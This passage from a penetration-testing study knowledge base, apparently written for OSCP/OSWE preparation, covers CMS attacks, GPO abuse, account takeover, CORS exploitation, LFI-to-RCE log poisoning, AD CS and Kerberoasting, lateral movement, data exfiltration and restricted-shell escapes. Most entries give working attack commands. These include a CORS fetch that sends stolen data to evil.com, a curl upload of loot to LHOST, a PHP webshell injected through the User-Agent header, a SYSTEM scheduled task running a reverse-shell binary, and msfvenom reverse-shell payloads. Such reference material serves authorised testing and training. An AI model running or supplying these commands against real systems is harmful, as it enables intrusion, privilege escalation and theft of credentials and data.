usually patched; the **plugins** and **weak admin creds** are the way in. Fingerprint version ->
find the vulnerable component -> exploit or log in and upload code.

## WordPress
    wpscan --url http://TARGET -e u,vp,vt         # users, vulnerable plugins/themes
    # login (brute or reuse) -> Appearance/Plugins editor -> edit a PHP file -> webshell
    # or upload a malicious plugin zip. xmlrpc.php enables fast password brute (system.multicall).

## Drupal
Version-specific pre-auth RCEs are famous: **Drupalgeddon2 (CVE-2018-7600)**, **Drupalgeddon3**.
    droopescan scan drupal -u http://TARGET       # version + modules
    searchsploit drupal <version>
Mirror the Path column and run that file by its extension (exploit-usage).

## Joomla
    joomscan --url http://TARGET                  # version, components
    # admin -> template editor -> inject PHP (the Joomla 'webshell via template' route)

## Common to all
Config files hold DB creds (wp-config.php, settings.php, configuration.php) — read them via LFI or
once you have a shell. Default/weak admin passwords are rampant.

## Pattern
"Which CMS, what version, and which plugin/theme or admin login is weak?" Fingerprint (wpscan/
droopescan/joomscan) -> known CVE or authenticated code upload (plugin/theme/template editor) ->
shell; then read the config for DB creds.

entries.title: Group Policy (GPO) abuse
entries.brief: Why edit rights on a GPO means code on every computer it applies to
entries.body:
## The idea
Group Policy Objects push settings to the users/computers in their linked OUs. If you can **edit a
GPO** (or create+link one), you can make every affected machine run your code — scheduled task,
startup script, or a new local admin — at the next policy refresh (~90 min, or `gpupdate /force`).

## Find where you can abuse it
BloodHound shows **GenericWrite/GenericAll/WriteDACL over a GPO** (or 'GPLink' on an OU). Those
edges are the targets.
    # the tooling:
    pyGPOAbuse 'corp.local/you:pass' -gpo-id <GUID> --command 'net user hx P@ss /add'
    SharpGPOAbuse  (Windows)  --AddComputerTask / --AddLocalAdmin

## What you plant
- An **immediate scheduled task** running as SYSTEM on the target computers.
- A **startup/logon script**.
- Add your account to the local **Administrators** group on every affected host.

## Scope impact
A GPO linked high (e.g. at the domain or a computers OU) can mean SYSTEM on **many** machines at
once — a fast domain-wide foothold.

## Pattern
"Do I have write rights over a GPO, or GPLink on an OU?" If yes, inject a SYSTEM scheduled task /
local-admin add via pyGPOAbuse/SharpGPOAbuse; it executes on every computer the GPO applies to at
the next refresh. (See: ad-acl-abuse, ad-persistence.)

entries.title: Account takeover: reset & registration flaws
entries.brief: The logic bugs that let you become another user without their password
entries.body:
## Password reset flaws (the common ATO)
- **Predictable/leaky token**: the reset token is sequential, time-based, or reflected in the
  response/URL -> forge or reuse it.
- **Host header poisoning**: the reset link is built from the `Host`/`X-Forwarded-Host` header;
  set it to your server and the victim's token comes to YOU.
    curl http://TARGET/reset -d 'email=victim@corp' -H 'Host: attacker.com'
- **No token binding**: the reset step doesn't verify the token matches the account, so you reset
  someone else's by changing the user/email parameter (IDOR on reset).
- **Response reflects the token/answer**: the API returns the token or the secret answer.

## Registration & identity flaws
- **Duplicate/normalised identities**: register `admin ` (trailing space) or `Admin` and collide
  with the real admin; Unicode normalisation tricks.
- **Email change without re-verify** -> point the account's email at you, then reset.
- **Mass assignment** at registration: add `"role":"admin"` to the JSON.

## 2FA bypass
Go straight to the post-login/next-step URL; reuse an old session; a missing check on the OTP
endpoint (brute the 4-6 digit code if no rate limit).

## Pattern
"Can I drive someone else's reset/registration?" Predictable or host-poisoned reset tokens, IDOR
on the reset target, email-change without re-verify, or mass assignment of role — each yields an
account you don't own. The fix you bypass is strict token binding + re-verification.

entries.title: Subdomain takeover
entries.brief: Why a dangling DNS record lets you claim someone else's subdomain
entries.body:
## The root cause
An organisation points a DNS record (usually a **CNAME**) at a third-party service
(app.example.com -> something.herokuapp.com / s3 / github.io / azurewebsites.net). If they later
**delete the service but leave the DNS record**, the name 'dangles' — and anyone who registers
that service name now **controls app.example.com**.

## Find candidates
    # enumerate subdomains, then check for dangling CNAMEs pointing at claimable services:
    subfinder -d example.com | dnsx -cname -resp
    # tools that flag takeovers against fingerprints:
    subzy run --targets subs.txt
    nuclei -l subs.txt -tags takeover
Signals: a CNAME to a SaaS + an error page like 'There is no app configured at that hostname' /
'NoSuchBucket'.

## Claim it
Register the referenced resource on that provider (the Heroku app name, the S3 bucket, the
GitHub Pages repo) using the exact target the CNAME points to. The subdomain now serves YOUR
content under the victim's domain.

## Impact
Phishing with a legit domain, stealing cookies scoped to *.example.com, bypassing OAuth/same-site
trust, and serving malware from a trusted name.

## Pattern
"Does a subdomain CNAME to a service that's no longer claimed?" Enumerate subdomains, spot dangling
CNAMEs with provider error pages, and register the resource to take the name over. The fix is
removing DNS records when you decommission a service.

entries.title: CORS misconfiguration
entries.brief: Why a sloppy Access-Control-Allow-Origin leaks authenticated data
entries.body:
## The mechanism
Browsers block cross-origin reads unless the server opts in with **CORS** headers. If an API
reflects the attacker's `Origin` into `Access-Control-Allow-Origin` **and** allows credentials, a
malicious site can read the victim's authenticated responses using the victim's own cookies.

## The dangerous responses
    Access-Control-Allow-Origin: https://attacker.com    (reflected -> trusts ANY origin)
    Access-Control-Allow-Credentials: true
The lethal combo is a **reflected origin + credentials true**. (`ACAO: *` with credentials is
disallowed by browsers, so attackers aim for reflection.) Also watch for weak origin checks:
`null` origin allowed, or a regex that matches `attacker-example.com` / `example.com.evil.com`.

## Test it
    curl -s -I http://TARGET/api/me -H 'Origin: https://evil.com' | grep -i access-control
If ACAO echoes `https://evil.com` and ACAC is true, it's exploitable.

## Exploit
Host a page that fetches the victim's endpoint **with credentials** and exfiltrates the response:
    fetch('https://TARGET/api/me',{credentials:'include'})
      .then(r=>r.text()).then(d=>fetch('https://evil.com/?'+btoa(d)));

## Pattern
"Does the API reflect my Origin and allow credentials?" Reflected ACAO + ACAC:true (or a weak
origin regex / null) = read a logged-in victim's data cross-site. The fix you bypass is a strict
server-side allow-list of origins.

entries.title: Port scanning — scan types, timing & evasion
entries.brief: What the nmap flags actually do, so you scan smart not just fast
entries.body:
## The scan types (and why)
- **-sS (SYN)** — default as root; sends SYN, reads SYN/ACK (open) or RST (closed), never finishes
  the handshake. Fast and relatively quiet.
- **-sT (connect)** — full TCP handshake; used as non-root and **through proxychains** (raw SYN
  can't traverse SOCKS).
- **-sU (UDP)** — slow (no handshake; relies on ICMP-unreachable for closed). Scan top ports.
- **-sn** — host discovery only (ping sweep), no port scan.
- **-sV / -sC / -O / -A** — version / default scripts / OS / all.

## Two-stage is the right habit
    nmap -p- --min-rate 1000 TARGET -oN all.txt       # find open ports fast
    nmap -sCV -p <open> TARGET -oN svc.txt            # deep only on those
`-p-` = all 65535; `--min-rate` floors packets/sec. Always `-oN/-oA` to save output.

## Timing & accuracy
- **-T0..T5** — paranoid..insane. -T4 is the lab default; lower on fragile hosts (drops skew
  results). `--min-rate`/`--max-rate` give finer control than -T.
- **-Pn** — skip host discovery (treat as up) when ICMP is blocked (common on Windows).
- **--open** — show only open ports; **--reason** explains each verdict.

## Firewall/IDS evasion (know they exist)
-f (fragment), -D (decoys), --source-port 53, --data-length, -sA (ACK probe to map filtering).
Use sparingly and only in scope; they trade stealth for reliability.

## Pattern
"Pick the scan type for the situation (SYN as root, connect through a proxy, UDP for the missed
services), stage it (all ports -> deep on open), and tune timing to the target." Save everything;
-Pn when ping is filtered. (Commands: oscp atlas nmap/rustscan.)

entries.title: Reverse engineering a binary — the basics
entries.brief: Static vs dynamic analysis, and the tools that reveal what a program does
entries.body:
## Two complementary approaches
- **Static** — read the program without running it: strings, symbols, disassembly, decompilation.
  Safe, complete, but you infer behaviour.
- **Dynamic** — run it and watch: debugger, syscalls, library calls, memory. You see real values
  but only the paths you trigger.

## Static toolkit
    file ./bin ; checksec --file=./bin        # type/arch + mitigations
    strings -n 6 ./bin | less                  # hardcoded creds, paths, format strings, URLs
    nm ./bin ; readelf -a ./bin                # symbols, sections, imports
    objdump -d -M intel ./bin                   # disassembly
    # decompilers: Ghidra (free, full-featured), radare2/rizin+cutter, IDA.
For managed code: dnSpy/ILSpy (.NET), jd-gui (Java) decompile to near-source.

## Dynamic toolkit
    ltrace ./bin ; strace ./bin                 # library / system calls (spot strcmp of a password!)
    gdb ./bin  (with GEF/pwndbg)                 # breakpoints, registers, memory, exploit dev

## What you're looking for
- CTF/keygen: the comparison that checks the flag/password (ltrace often shows a `strcmp`).
- Pentest custom SUID binary: what commands/files it touches (strace), hardcoded creds (strings),
  and overflow bugs (gdb, see buffer-overflow-basics).

## Pattern
"Read it (file/strings/objdump/Ghidra), then run it (ltrace/strace/gdb) to confirm." Static finds
the interesting function; dynamic shows the real values and lets you develop an exploit. (See:
checksec, binary-exploit-mitigations.)

entries.title: Windows scheduled tasks (privesc & persistence)
entries.brief: The Windows cron: how tasks run and when editing one gives you SYSTEM
entries.body:
## The idea
Scheduled Tasks run programs on a trigger (time, logon, event), often as **SYSTEM** or another
user. If you can modify a task's action, create a task, or write the binary/script it runs, that
privilege becomes yours — the Windows parallel of cron/systemd privesc.

## Enumerate
    schtasks /query /fo LIST /v                 # all tasks: Run As User, Task To Run, schedule
    schtasks /query /fo LIST /v | findstr /i "SYSTEM Task To Run"
    # task XMLs live in C:\Windows\System32\Tasks\ (check write perms)
winPEAS/PowerUp flag tasks whose binary or folder you can write.

## Abuse
- **Writable task binary/script**: replace what a SYSTEM task runs.
- **Writable task definition** (the XML in \Tasks\): edit the action.
- **Create a task** (if you can) to run as SYSTEM or at the next logon:
    schtasks /create /tn upd /tr "C:\Temp\rev.exe" /sc minute /mo 1 /ru SYSTEM
    schtasks /run /tn upd
For persistence, a logon-triggered task re-establishes access.

## Pattern
"Does a task run as SYSTEM, and can I control its action, binary, or XML — or create one?" Any of
those = SYSTEM at the next trigger. `schtasks /query /v` + check write perms on the Task To Run.
(See: windows-service-privesc, linux-systemd-privesc.)

entries.title: Data exfiltration channels
entries.brief: Getting loot out when the obvious paths are blocked
entries.body:
## The problem
You have data on a target but egress is filtered. Exfil = move it out over a channel that's
allowed, ideally blending with normal traffic. (Authorised testing: document what you move.)

## Channels, from easiest to stealthiest
- **HTTP(S) to your box**: curl/wget POST, or a listener; TLS blends in.
    curl -s -X POST --data-binary @loot.tar http://LHOST/u
- **SMB**: copy to your impacket-smbserver share (Windows-friendly).
- **DNS tunnelling**: encode data into subdomain queries to a server you control (dnscat2,
  iodine) — survives when only DNS is allowed; slow but sneaky.
- **ICMP tunnelling**: pack bytes into ping payloads (icmpsh) when ICMP is permitted.
- **Out-of-band in exploits**: SSRF/XXE/SQLi that call back to your server (Burp Collaborator /
  your listener) exfiltrate a value when there's no direct output.

## Make it fit the channel
    base64 -w0 loot | fold -w63      # chunk for DNS labels / size limits
    # split large files: split -b 1M loot part_ ; reassemble with cat
Compress + encode first (gzip | base64) to shrink and survive text-only paths (encoding-basics).

## Pattern
"What egress is allowed, and how do I shape data to fit it?" Prefer HTTPS/SMB; fall back to DNS/
ICMP tunnels when filtered; use OOB callbacks when an injection gives no direct output. Chunk and
encode to match the channel's limits.

entries.title: The pivoting playbook (chaining it together)
entries.brief: A decision guide across SSH forwards, SOCKS, chisel and ligolo
entries.body:
## The goal
Reach hosts/ports you can't touch directly by routing through a compromised machine — and keep
doing it for deeper subnets (double pivot).

## Pick the mechanism
1. **Have SSH creds on the pivot?**
   - one internal service -> `ssh -L local:host:rport user@pivot` (port-forwarding)
   - whole network -> `ssh -D 1080 user@pivot` + proxychains (dynamic SOCKS)
2. **No SSH, can run a binary?**
   - `chisel` reverse SOCKS (server on you, client on pivot) + proxychains
   - `ligolo-ng` tun interface -> tools run **natively** (best for AD; no proxychains)
3. **Catch a shell from a host that can't reach you?** `ssh -R` or chisel reverse forward.

## Use it
    proxychains -q nmap -sT -Pn -p 445,3389 10.10.20.0/24      # scan the internal net
    proxychains -q evil-winrm -i 10.10.20.7 -u svc -p pass     # interactive, through SOCKS
    # ligolo: session, route_add, tunnel_start. nmap -sT -Pn --unprivileged. Not -sS.

## Double pivot
From pivot A you reach subnet B; compromise host B2, run another agent/forward **through** the
first tunnel to reach subnet C. Ligolo chains cleanly (add routes); with SSH, forward a port on A
to B2's SSH then -D again.

## Pattern
"Which host can reach the target, what can I run there, and do I need one port or the whole net?"
SSH -L/-D when you have creds; chisel/ligolo when you don't; ligolo for native AD tooling; chain
agents for deeper subnets. (See: port-forwarding, proxychains-pivoting.)

entries.title: LFI to RCE: log & wrapper poisoning
entries.brief: Turning a file-read into code execution by controlling what you include
entries.body:
## The bridge from read to run
A Local File Inclusion lets the server **execute** whatever PHP is in the file you include
(lfi-rfi-logic). So get your PHP code into a file the server will read — that's poisoning.

## Log poisoning
Write PHP into a log the web user can read, then include it:
- **Access log**: put code in a request header the log records (User-Agent is easy), then include
  the log.
    curl http://TARGET/ -A '<?php system($_GET["c"]); ?>'
    http://TARGET/?page=/var/log/apache2/access.log&c=id
- **Auth log**: an SSH login attempt with a PHP username lands in /var/log/auth.log -> include it.
- **Mail**: send to a user; include /var/mail/<user>.

## PHP wrapper poisoning
    php://input        # POST body becomes the included code:  ?page=php://input  (+ PHP in the body)
    data://text/plain;base64,<base64 of PHP>     # inline code, if allow_url_include on
    php://filter/convert.base64-encode/resource=index.php    # read source (not RCE, but leaks code)
    phar:// / zip://    # include code hidden in an uploaded archive

## Session poisoning
If you control a value stored in your PHP session file, include
/var/lib/php/sessions/sess_<PHPSESSID>.

## Pattern
"I can include a file — which file can I get my PHP into?" Logs (via a header/username), php://
input/data wrappers, the session file, or an uploaded archive (phar). Poison it, include it, run
commands. (See: lfi-rfi-logic, file-upload-bypass.)

entries.title: Second-order (stored) injection
entries.brief: Why input that's safe on the way in detonates when used later
entries.body:
## The idea
First-order injection fires on the request that carries it. **Second-order** input is **stored**
safely, then later read back and used **unsafely** in a different context — so the vulnerable sink
is nowhere near where you submitted the payload.

## The classic: second-order SQLi
1. Register a username like `admin'-- ` (stored verbatim — the insert is parameterised, so no bug
   on the way in). The other probes are the list on sqli-logic.
2. Later, a **password-change** or profile feature builds a query using that stored username by
   string concatenation -> your payload executes then.
The scanner that only tests the registration form misses it; you must trace where stored data is
*reused*.

## Other second-order flavours
- **Stored XSS** is the same pattern for JS (xss-logic) — saved input runs when another page
  renders it.
- **Second-order command injection / SSRF**: a value you set (a hostname, a filename) is later fed
  to a shell/HTTP client by a background job or admin view.

## Find it (the method)
Think in **data flow**, not single forms: what fields are *stored*, and *where else* are they read
and used? Mark a unique payload, then exercise every feature that might reuse it (profile view,
reports, admin pages, cron jobs) and watch for it detonating. This is core web-source-review.

## Pattern
"Where is my stored input later used unsafely?" The entry point is clean; the sink is elsewhere and
later. Plant a marker, then trigger every feature that reads it back. (See: sqli-logic,
web-source-review.)

entries.title: Arbitrary file read — what to grab
entries.brief: Turning any read primitive (LFI, XXE, traversal) into creds and a foothold
entries.body:
## You have a read — now read the right things
LFI, XXE, path traversal, a backup endpoint, or a DB file-read all give **arbitrary file read**.
The skill is knowing *which* files turn a read into access. Work this list.

## Always-useful reads
    /etc/passwd                      # confirm the bug + enumerate users
    /etc/hosts, /etc/hostname        # internal names
    /proc/self/environ, /proc/self/cmdline   # env vars (secrets) + how the app was launched
    /proc/self/cwd/<app files>       # the app's working dir without knowing the full path
    ~/.ssh/id_rsa  (for each user)   # a private key -> SSH in (chmod 600 first)
    ~/.bash_history, ~/.*_history     # commands, often with creds

## App & service config (the creds)
Web app config in the webroot: wp-config.php, .env, config.php, settings.py, application.yml,
database.yml, web.config. Service configs under /etc. On Windows: web.config, unattend.xml,
C:\Windows\System32\config\SAM+SYSTEM (if readable), IIS logs.

## Read-to-RCE pivots
- Read an **SSH private key** -> log in.
- Read **source** (php://filter base64) -> find more bugs / hardcoded secrets (web-source-review).
- Combine with **log/wrapper poisoning** to upgrade read -> execute (log-poisoning).
- Read a session file / a token -> impersonate.

## Pattern
"A read is a foothold if I read the right file." passwd to confirm, /proc/self/environ for secrets,
SSH keys to log in, app config for DB/admin creds, source for more bugs. Keep a mental checklist so
a 'just a file read' becomes access.

entries.title: AD Certificate Services abuse (ESC1-ESC8)
entries.brief: Why a misconfigured certificate template becomes Domain Admin
entries.body:
## Why AD CS matters
Active Directory Certificate Services issues certificates that can be used to **authenticate** (PKINIT
-> a TGT). A misconfigured **certificate template** lets a low-priv user request a cert **as someone
else** (e.g. Domain Admin). Certipy maps and exploits these as the ESC1-ESC8 techniques.

## Enumerate first
    certipy find -u bob@corp.local -p 'P@ss' -dc-ip DC -vulnerable
    # or: certipy find ... -stdout | less   (lists CAs + flagged templates)

## The common ones
- **ESC1** — a template where the **enrollee supplies the subject** (SAN) and allows client auth.
  Request a cert with `-upn Administrator` -> authenticate as Administrator.
    certipy req -u bob@corp -p pass -ca CORP-CA -template Vuln -upn Administrator@corp.local
    certipy auth -pfx administrator.pfx -dc-ip DC          # PKINIT -> TGT + NT hash
- **ESC8** — NTLM **relay to the CA's web enrollment** (HTTP). Coerce a DC (PetitPotam) and relay to
  http://CA/certsrv -> get a DC cert -> DCSync. (See: coercion-ntlm-relay.)
    impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
- **ESC2/3/4/6/7** — overly broad EKUs, enrollment-agent abuse, writable template ACLs, CA flag
  (EDITF_ATTRIBUTESUBJECTALTNAME2), and CA-admin rights — each a path certipy automates.

## Why it's lethal
A cert is a durable credential: valid even after the password changes, and it maps straight to a
TGT/NT hash. ESC1/ESC8 are frequent one-step paths to DA.

## Pattern
"certipy find -vulnerable -> which ESC?" Request a cert as a privileged user (ESC1) or relay to the
CA (ESC8), then `certipy auth` the .pfx into a TGT/NT hash. Durable domain compromise via PKI.
(See: atlas certipy, active-directory-basics.)

entries.title: Kerberoasting
entries.brief: Any domain user can request service tickets for SPN accounts and crack them offline
entries.body:
## The idea
Any authenticated domain user can request a TGS for any account with an SPN. The ticket is
encrypted with the SERVICE ACCOUNT's password hash — crack it offline. Service accounts often have
weak, non-expiring passwords, so this is a top AD escalation path.

## Request the tickets (needs any domain creds)
    impacket-GetUserSPNs corp.local/user:pass -dc-ip DC -request -outputfile spns.txt
    nxc ldap DC -u user -p pass --kerberoasting out.txt
    # Windows: Rubeus.exe kerberoast /outfile:spns.txt

## Crack
    hashcat -m 13100 spns.txt rockyou.txt          # $krb5tgs$
    john --format=krb5tgs spns.txt

## Targeted kerberoast (if you have write on a user)
    # set an SPN on a user you control, roast, then remove it (see atlas: targetedKerberoast)

## Gotchas
- Prioritise accounts that are also privileged (check group membership) — a cracked DA SPN = game over.
- AES-encrypted tickets (-m 19700/19600) crack far slower than RC4 (13100); request RC4 if possible.
- Noisy-ish (TGS requests) but normal-looking; it's expected on exams.

entries.title: HTTP request smuggling
entries.brief: Why front-end and back-end disagreeing on request length is dangerous
entries.body:
## The root cause
When a front-end proxy and a back-end server **disagree on where one request ends**, you can smuggle
a second, hidden request. The disagreement comes from handling `Content-Length` (CL) vs
`Transfer-Encoding: chunked` (TE) differently.

## The variants
- **CL.TE** — front-end uses Content-Length, back-end uses Transfer-Encoding.
- **TE.CL** — the reverse.
- **TE.TE** — both support TE but one can be tricked into ignoring it (obfuscated header).
You craft a body that one server treats as finished and the other treats as the start of a new
request — the "smuggled" prefix is prepended to the **next** user's request.

## Impact
- Bypass front-end access controls (reach restricted paths the proxy would block).
- Poison the next victim's request/response (steal their session, serve them your content).
- Cache poisoning, credential capture.

## Find & exploit
Timing-based detection is the safe first test (a malformed TE causes the back-end to wait). Then
confirm by smuggling a request to a known endpoint. Burp's **HTTP Request Smuggler** extension (and
Repeater's single-connection mode) automates detection and PoCs.

## Pattern
"Do the front-end and back-end parse request boundaries the same way?" If not (CL.TE/TE.CL/TE.TE),
smuggle a hidden request to bypass controls or hijack the next user. The fix you bypass is
consistent, strict parsing (and HTTP/2 end-to-end). Advanced/OSWE-level.

entries.title: OAuth & SAML flaws
entries.brief: How federated-login flows break and let you become another user
entries.body:
## The two protocols
- **OAuth 2.0 / OIDC** — delegated access via tokens (that 'Login with Google' flow).
- **SAML** — XML-based SSO assertions between an IdP and the app (enterprise SSO).
Both move a signed/trusted statement of 'who you are' — break the trust and you impersonate anyone.

## OAuth bugs
- **redirect_uri abuse** — weak validation lets you set redirect_uri to your site and **steal the
  code/token** (open-redirect-to-token-theft).
- **state missing** -> CSRF on the login (force-link your account).
- **implicit/token leakage** in URLs/referrer; **access-token reuse** across clients.
- **account takeover via email** — if the app trusts the OAuth email claim without verification and
  you control a matching unverified account.

## SAML bugs
- **Signature not validated / stripped** — remove or break the signature and the IdP assertion is
  trusted anyway -> forge any user.
- **XML Signature Wrapping (XSW)** — add a second, attacker-controlled assertion the validator
  checks the signature on but the app *uses* the forged one.
- **XXE in the SAML XML parser** (see xxe-logic).
Tools: SAML Raider (Burp) for tampering/XSW.

## Pattern
"What proves identity in this flow, and is it validated strictly?" OAuth: abuse redirect_uri/state/
email-trust to capture or forge tokens. SAML: strip/wrap the signature or XXE the parser to forge
the assertion. Decode the base64/JWT pieces first (encoding-basics, cookies-sessions-jwt).

entries.title: Windows lateral movement (exec methods)
entries.brief: The ways to run code on another Windows host with creds/hash
entries.body:
## The idea
Once you hold a credential/hash that is **local admin** on other hosts, you move laterally by
executing on them remotely. Pick the method by stealth and what's open.

## The execution methods (Impacket + friends)
    impacket-psexec     corp/admin:pass@HOST   # creates a service -> SYSTEM shell (loud, AV-prone)
    impacket-smbexec    ...                     # service-based but no binary dropped (quieter)
    impacket-wmiexec    ...                     # via WMI, no service install (stealthier, semi-interactive)
    impacket-atexec     ...  'command'          # via the task scheduler (one-shot)
    impacket-dcomexec   ...                     # via DCOM objects
    evil-winrm -i HOST -u admin -p pass         # WinRM (5985) -> clean PowerShell session
    xfreerdp /u:admin /p:pass /v:HOST           # interactive desktop (RDP 3389)
All accept **-hashes LM:NT** for pass-the-hash and **-k** for Kerberos/pass-the-ticket.

## Find where your cred is admin
    nxc smb 10.10.20.0/24 -u admin -p pass           # 'Pwn3d!' = local admin there
    nxc smb SUBNET -u admin -H <NThash>              # same, with a hash

## Choose wisely
psexec = reliable but noisy; wmiexec/smbexec = quieter; WinRM = cleanest when 5985 is open; RDP when
you need a GUI. Match to the ports open and the EDR present.

## Pattern
"My cred is local admin on which hosts, and what exec method fits?" nxc to find the hosts, then
wmiexec/psexec/evil-winrm (with -hashes for PtH). This is how one admin hash becomes the whole
subnet. (See: pass-the-hash-ticket, atlas impacket-*.)

entries.title: Modifying public exploits (make them actually run)
entries.brief: The routine edits a PoC needs before it works against your target
entries.body:
## Why editing is the norm
Public exploits (Exploit-DB, GitHub) rarely run as-is. They were written for a specific target,
offset, or attacker setup. Read the code, then adjust — never run blindly.

## Read it first
- What language/dependencies? What does it actually do (don't run unknown payloads at yourself)?
- Does it need a listener, a specific OS/version, or a particular service state?

## The usual edits
- **LHOST/LPORT/RHOST** — set to your tun0 IP and the target. Check the exact variable names.
- **Shellcode** — replace a stale/placeholder payload with your own:
    msfvenom -p windows/shell_reverse_tcp LHOST=.. LPORT=.. -f python -b '\x00'   # match format + badchars
- **Offsets / return address / padding** — for memory-corruption PoCs, recompute the offset and
  pick a valid JMP ESP for *your* target build (buffer-overflow-basics).
- **Target version / URL paths** — point at the right endpoint; adjust auth tokens/cookies.
- **Python 2 vs 3** — many old PoCs are py2: fix print/encode, or run with python2.

## Then test safely
Start a listener first, run against the target, read errors, iterate. Keep a copy of the original.

## Pattern
"Read -> set LHOST/LPORT/target -> refresh shellcode (format + badchars) -> fix offsets/version ->
test with a listener ready." A PoC is a starting point you adapt, not a magic button. (See:
searchsploit, exploit-usage, msfvenom, cross-compiling-exploits.)

entries.title: Compiling & cross-compiling exploits
entries.brief: Building a C exploit for the target's architecture and OS
entries.body:
## The problem
An exploit's source must be compiled **for the target**, not your Kali. Wrong arch, wrong OS, or
missing libraries = it won't run. Match architecture, link appropriately, and cross-compile for
Windows.

## Linux targets
    gcc exploit.c -o exploit                     # same arch as Kali (x64)
    gcc -m32 exploit.c -o exploit                # 32-bit target (needs gcc-multilib)
    gcc -static exploit.c -o exploit             # static link -> no missing-.so surprises on the target
Check the target first: `uname -m`, `/proc/version`, `ldd --version`. Static linking is the safe
default when the target's libc differs.

## Windows targets (cross-compile from Kali)
    i686-w64-mingw32-gcc exploit.c -o exploit.exe        # 32-bit Windows
    x86_64-w64-mingw32-gcc exploit.c -o exploit.exe      # 64-bit Windows
    # (install: apt install mingw-w64)

## Common gotchas
- **Badchars in shellcode** compiled in — generate with msfvenom `-b` to exclude them.
- **Compile ON a matching system** when the exploit needs exact libc versions (or use -static).
- **32 vs 64** mismatch is the #1 "it just crashes" cause — confirm the target arch.
- Keep your Kali clean: compile from a working dir, not the untrusted download dir.

## Pattern
"What arch/OS is the target, and will its libraries match?" gcc (-m32 / -static) for Linux,
mingw-w64 for Windows, msfvenom -b for clean shellcode. Match the binary to the target before you
blame the exploit. (See: exploit-modification, buffer-overflow-basics.)

entries.title: Escaping a restricted shell (rbash etc.)
entries.brief: Why limited shells leak, and the standard ways out
entries.body:
## What a restricted shell is
rbash / rksh / lshell and 'jailed' SSH menus limit you: no `cd`, no `/` in commands, a locked
`PATH`, no redirection. The goal is to break out to a normal shell so you can actually work.

## First, map the jail
    echo $PATH ; echo $SHELL ; compgen -c       # what PATH, what shell, what commands exist
    ls -la /the/allowed/bin                      # which binaries are reachable
The escape usually comes from **an allowed program that can spawn a shell or run commands**.

## The classic escapes
- **Via an allowed interpreter/editor/pager** (GTFOBins-style, but for the restricted shell):
    vi    -> :set shell=/bin/bash  then  :shell      (or :!/bin/bash)
    less/man -> !/bin/bash
    awk 'BEGIN{system("/bin/bash")}'
    python3 -c 'import os;os.system("/bin/bash")'
    find . -exec /bin/bash \;   ;   ed  then  !sh   ;   nmap --interactive (old)
- **Spawn an unrestricted shell directly** if it's on PATH: `bash`, `sh`, `/bin/bash --noprofile`.
- **SSH command trick**: `ssh user@host -t "bash --noprofile"` or `ssh user@host "/bin/sh"` to skip
  the restricted login shell entirely.
- **Fix the environment** after escaping: `export PATH=/usr/bin:/bin` and `export SHELL=/bin/bash`.

## Pattern
"Which allowed program can run a command or shell?" An editor (vi/less), a language (python/awk/
perl), or `find -exec` breaks out; or bypass the login shell over SSH with `-t`. Then reset PATH/
SHELL and continue enumeration. (See: gtfobins-logic, shell-tty.)

entries.title: Burp Suite workflow
entries.brief: The proxy -> repeater -> intruder loop that drives web testing
entries.body:
## Set up the proxy
Point your browser at Burp (127.0.0.1:8080) and install Burp's CA cert so HTTPS is intercepted.
Now every request flows through the **Proxy** tab — your map of the app's traffic.

## The core tabs
- **Proxy / HTTP history** — see and intercept requests; "Intercept on" to edit in flight.
- **Target / Site map** — the discovered structure; set your in-scope target to cut noise.
- **Repeater** (Ctrl-R to send here) — hand-edit a single request and resend; the workhorse for
  testing one parameter at a time (SQLi, IDOR, auth).
- **Intruder** — automate varying a position (fuzz params, brute a login, enumerate IDs). Attack
  types: Sniper (one position), Cluster bomb (multiple lists).
- **Decoder / Inspector** — base64/url/hex/JWT decode inline.
- **Comparer** — diff two responses (true/false for blind bugs).

## A typical flow
1. Browse the app through Burp to populate the site map.
2. Find an interesting request -> **Send to Repeater**.
3. Tamper one thing at a time (a param, a header, the method) and read the response.
4. Automate with **Intruder** (fuzz/brute) or point sqlmap at a saved request (`-r req.txt`).
5. Use Collaborator for OOB (SSRF/XXE/blind) callbacks.

## Pattern
"Capture in Proxy, isolate in Repeater, automate in Intruder." The Community edition is enough for
OSCP/most OSWE (Intruder is throttled — swap to ffuf/sqlmap for speed). Save requests to feed CLI
tools. (See: http-fundamentals, the injection-logic entries.)

entries.title: Nmap NSE scripts
entries.brief: Using the scripting engine for detection and light exploitation
entries.body:
## What NSE is
The Nmap Scripting Engine runs Lua scripts against discovered services — version probing, vuln
checks, brute force, and some exploitation. Scripts live in /usr/share/nmap/scripts/ and are
grouped by **category** (auth, brute, discovery, vuln, safe, intrusive, exploit).

## Run them
    nmap -sC TARGET                           # the 'default' category (safe, useful)
    nmap --script vuln -p 80,443 TARGET       # known-vuln checks
    nmap --script smb-enum-shares,smb-os-discovery -p445 TARGET
    nmap --script "http-*" -p80 TARGET        # wildcard a family
    nmap --script ftp-anon,ssh-auth-methods TARGET

## Find the right script
    ls /usr/share/nmap/scripts | grep -i smb
    nmap --script-help smb-vuln-ms17-010      # what it does, args
    locate .nse | grep -i <service>

## Script arguments
    nmap --script http-enum --script-args http-enum.basepath=/app/ TARGET
    nmap --script smb-brute --script-args userdb=users.txt,passdb=pass.txt -p445 TARGET

## Cautions
`vuln`/`intrusive`/`exploit` scripts can be noisy or disruptive — know the category. Verify every
hit manually; NSE has false positives.

## Pattern
"Which service, which script family?" `-sC` for the safe defaults, `--script vuln` for checks,
service-specific scripts (smb-*, http-*, ftp-*) for depth. `--script-help` before you run something
intrusive. (See: port-scanning-deep, atlas nmap.)

entries.title: sqlmap workflow (and OSCP caveats)
entries.brief: Driving sqlmap from a captured request, step by step
entries.body:
## Feed it a real request
The reliable way is a saved request (handles POST, cookies, headers):
    # save the request from Burp (right-click -> Copy to file) as req.txt, then:
    sqlmap -r req.txt --batch

## The escalation ladder
    sqlmap -r req.txt --batch                     # detect injectable params
    sqlmap -r req.txt --batch --dbs               # list databases
    sqlmap -r req.txt -D app --tables             # tables in a db
    sqlmap -r req.txt -D app -T users --dump      # dump a table
    sqlmap -r req.txt --current-user --is-dba     # who am I / admin?

## Tuning when it finds nothing
    --level=5 --risk=3        # more payloads/places (headers, cookies)
    -p id                     # target a specific parameter
    --technique=BEUST         # boolean/error/union/stacked/time
    --dbms=mysql              # skip fingerprinting if you know it
    --tamper=space2comment    # WAF evasion tampers

## Going further
    --os-shell / --os-cmd='id'    # OS command execution (where the DBMS allows, e.g. MSSQL xp_cmdshell)
    --sql-shell                    # interactive SQL

## OSCP caveat
sqlmap is an **automated exploitation tool** — on the OSCP exam its use is restricted (and banned
